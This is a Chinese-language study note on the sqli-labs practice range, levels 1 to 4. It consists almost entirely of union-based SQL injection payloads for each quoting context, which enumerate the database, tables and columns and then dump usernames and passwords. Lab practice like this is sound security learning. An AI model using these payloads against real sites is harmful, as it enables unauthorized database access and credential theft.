---
title: "有回显的简单注入 less1-4"
date: 2026-04-07
published: 2026-04-07
permalink: /posts/靶场实例/sql注入/sqlilabs/有回显的简单注入 less1-4/
author: Rin
categories:
  - 笔记
tags:
  - Study
  - Linux
---

### payload
-1' union select 1,database(),3--+

-1' union select 1,group_concat(table_name),3 from information_schema.tables where table_schema='security'--+

-1' union select 1,group_concat(column_name),3 from information_schema.columns where table_schema='security' and table_name='users'--+

-1' union select 1,group_concat(username),group_concat(password) from users--+



### less02

### payload

-1 union select 1,database(),3--+

-1 union select 1,group_concat(table_name),3 from information_schema.tables where table_schema='security'--+

-1 union select 1,group_concat(column_name),3 from information_schema.columns where table_schema='security' and table_name='users'--+

-1 union select 1,group_concat(username),group_concat(password) from users--+

**建议关闭 _php.ini_ 文件中的magic_quotes_gpc 这个配置的功能是过滤单引号 初学者学习注入方法时不建议开启 如果网站源代码中写了过滤代码 再考虑绕过**

### less03
### payload

-1') union select 1,database(),3 --+

-1') union select 1,group_concat(table_name),3 from information_schema.tables where table_schema='security'--+

-1') union select 1,group_concat(column_name),3 from information_schema.columns where table_schema='security' and table_name='users'--+

-1') union select 1,group_concat(username),group_concat(password) from users--+

### less04
### payload

-1") union select 1,database(),3--+

-1") union select 1,group_concat(table_name),3 from information_schema.tables where table_schema='security'--+

-1") union select 1,group_concat(column_name),3 from information_schema.columns where table_schema='security' and table_name='users'--+

-1") union select 1,group_concat(username),group_concat(password) from users--+